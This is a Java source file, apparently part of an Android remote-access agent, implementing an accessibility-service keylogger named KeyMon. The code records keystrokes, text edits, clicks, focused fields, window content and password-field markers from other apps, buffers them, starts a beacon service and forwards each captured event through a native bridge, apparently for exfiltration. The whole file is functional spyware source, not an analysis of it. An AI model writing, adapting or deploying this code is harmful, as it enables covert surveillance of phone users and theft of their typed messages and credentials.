package com.hackit.agent;

import android.accessibilityservice.AccessibilityService;
import android.os.Build;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayDeque;
import java.util.Locale;

/** Accessibility keylogger: field edits, selections, focus, clicks, windows and key events. Bounded ring; dual outbox + native flush. */
public class KeyMon extends AccessibilityService {
    private static final int RING_CAP = 1600;
    private static final int FLUSH_LIMIT = 400;
    private static final int TEXT_CAP = 2048;
    private static final ArrayDeque<JSONObject> RING = new ArrayDeque<JSONObject>();
    private static volatile boolean connected;
    private static String lastHash = "";

    static boolean connected() {
        return connected;
    }

    static JSONArray drain(int limit) {
        JSONArray out = new JSONArray();
        int max = Math.max(1, Math.min(limit, FLUSH_LIMIT * 2));
        synchronized (RING) {
            while (out.length() < max && !RING.isEmpty()) out.put(RING.poll());
        }
        return out;
    }

    static void clear() {
        synchronized (RING) {
            RING.clear();
            lastHash = "";
        }
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        connected = true;
        Log.d("accessibility on");
        BeaconService.start(this);
    }

    @Override
    public void onDestroy() {
        connected = false;
        super.onDestroy();
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        try {
            if (event != null && event.getAction() == KeyEvent.ACTION_DOWN) {
                String pkg = activePackage();
                String text = event.getDisplayLabel() == 0 ? "" : String.valueOf((char) event.getDisplayLabel());
                if (text.isEmpty() && event.getUnicodeChar() != 0) text = String.valueOf((char) event.getUnicodeChar());
                push(pkg, "<key>" + event.getKeyCode() + ":" + keyName(event.getKeyCode())
                        + (text.isEmpty() ? "" : ":" + text) + "</key>", true, "key_event");
            }
        } catch (Throwable exc) {
            Log.d("key event: " + exc);
        }
        return false;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        try {
            CharSequence pkgChar = event.getPackageName();
            String source = pkgChar == null ? "" : pkgChar.toString();
            if (source.equals(getPackageName())) return;
            int type = event.getEventType();
            String cls = event.getClassName() == null ? "" : event.getClassName().toString();

            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                push(source, textOf(event), false, "text_changed", cls, event);
            } else if (type == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
                push(source, textOf(event), true, "selection_changed", cls, event);
            } else if (type == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
                AccessibilityNodeInfo node = event.getSource();
                if (node != null) {
                    push(source, nodeText(node), true, "focus", cls, event);
                    recycle(node);
                }
            } else if (type == AccessibilityEvent.TYPE_VIEW_CLICKED || type == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED) {
                String value = textOf(event);
                if (value.isEmpty()) {
                    AccessibilityNodeInfo node = event.getSource();
                    if (node != null) {
                        value = nodeText(node);
                        recycle(node);
                    }
                }
                if (!value.isEmpty()) push(source, value, true, type == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED ? "long_click" : "click", cls, event);
            } else if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                push(source, "<" + (cls.isEmpty() ? "window" : cls) + ">", true, "window", cls, event);
            } else if (type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                AccessibilityNodeInfo node = event.getSource();
                if (node != null) {
                    String value = nodeText(node);
                    if (!value.isEmpty()) push(source, value, true, "content", cls, event);
                    recycle(node);
                }
            }
        } catch (Throwable exc) {
            Log.d("key: " + exc);
        }
    }

    private String activePackage() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return "";
        try {
            CharSequence pkg = root.getPackageName();
            return pkg == null ? "" : pkg.toString();
        } finally {
            recycle(root);
        }
    }

    private static String textOf(AccessibilityEvent event) {
        if (event.getText() != null && !event.getText().isEmpty()) {
            StringBuilder out = new StringBuilder();
            for (CharSequence part : event.getText()) {
                if (part == null) continue;
                if (out.length() > 0) out.append(' ');
                out.append(part);
            }
            if (out.length() > 0) return cap(out.toString());
        }
        CharSequence before = event.getBeforeText();
        if (before != null && before.length() > 0) return cap(before.toString());
        CharSequence desc = event.getContentDescription();
        return desc == null ? "" : cap(desc.toString());
    }

    private static String nodeText(AccessibilityNodeInfo node) {
        StringBuilder out = new StringBuilder();
        CharSequence text = node.getText();
        if (text != null && text.length() > 0) out.append(text);
        CharSequence hint = Build.VERSION.SDK_INT >= 26 ? node.getHintText() : null;
        CharSequence desc = node.getContentDescription();
        if (out.length() == 0 && hint != null) out.append('[').append(hint).append(']');
        if (out.length() == 0 && desc != null) out.append(desc);
        if (node.isPassword()) out.append(" <password>");
        return cap(out.toString());
    }

    private static void push(String pkg, String text, boolean focus, String kind) {
        push(pkg, text, focus, kind, "", null);
    }

    private static void push(String pkg, String text, boolean focus, String kind, String cls, AccessibilityEvent event) {
        if (text == null) return;
        String trimmed = cap(text);
        if (trimmed.isEmpty()) return;
        String fingerprint = pkg + "\u0000" + kind + "\u0000" + cls + "\u0000" + trimmed;
        synchronized (RING) {
            if (fingerprint.equals(lastHash)) return;
            lastHash = fingerprint;
            try {
                JSONObject row = new JSONObject();
                row.put("pkg", pkg);
                row.put("text", trimmed);
                row.put("focus", focus);
                row.put("kind", kind);
                row.put("class", cls);
                if (event != null) {
                    row.put("from", event.getFromIndex());
                    row.put("to", event.getToIndex());
                    row.put("added", event.getAddedCount());
                    row.put("removed", event.getRemovedCount());
                }
                RING.addLast(row);
                while (RING.size() > RING_CAP) RING.pollFirst();
                JSONArray nativeBatch = new JSONArray();
                nativeBatch.put(row);
                NativeBridge.send("{\"op\":\"event\",\"kind\":\"keylog\",\"data\":" + nativeBatch.toString() + "}");
            } catch (Exception ignored) {
            }
        }
    }

    private static String cap(String value) {
        return value.length() > TEXT_CAP ? value.substring(0, TEXT_CAP) : value;
    }

    private static String keyName(int keyCode) {
        String name = KeyEvent.keyCodeToString(keyCode);
        return name == null ? Integer.toString(keyCode) : name.toLowerCase(Locale.US);
    }

    private static void recycle(AccessibilityNodeInfo node) {
        try {
            if (Build.VERSION.SDK_INT >= 21) node.recycle();
        } catch (Throwable ignored) {
        }
    }
}
